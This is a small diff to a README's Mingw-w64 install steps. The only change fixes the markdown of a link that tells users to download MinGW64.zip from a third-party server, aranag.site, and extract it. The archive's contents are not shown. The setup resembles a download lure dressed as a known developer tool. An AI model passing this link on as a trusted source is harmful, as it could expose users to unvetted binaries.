@@ -4,7 +4,7 @@ This project is licensed under the MIT License – see the [LICENSE](LICENSE) fi
 ## How to install the Mingw-w64 
 
 #### Download the Mingw-w64 archive:
-Click here to download the zip file directly from our server: (Direct Download Link)[https://aranag.site/download/MinGW64.zip]
+Click here to download the zip file directly from our server: [Direct Download Link](https://aranag.site/download/MinGW64.zip)
 
 #### Extract the archive:
 Once the download is complete, extract the contents of the mingw64.zip file to a location on your computer. We recommend a simple path like C:\mingw64.
